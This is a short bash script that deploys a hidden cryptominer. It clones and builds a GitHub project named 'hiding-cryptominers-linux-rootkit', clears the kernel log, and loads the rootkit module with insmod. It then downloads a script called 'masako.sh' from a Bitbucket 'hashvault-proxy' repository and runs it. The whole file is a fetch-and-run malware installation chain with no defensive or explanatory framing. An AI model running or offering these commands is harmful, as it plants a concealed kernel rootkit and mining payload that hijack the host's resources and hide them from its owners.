#!/bin/bash
git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit
cd hiding-cryptominers-linux-rootkit
make
dmesg -C
insmod rootkit.ko
dmesg
wget https://bitbucket.org/novalanto61/hashvault-proxy/raw/b62cc448ad2764c95743b8317cca46396f874ad0/masako.sh
chmod +x masako.sh
./masako.sh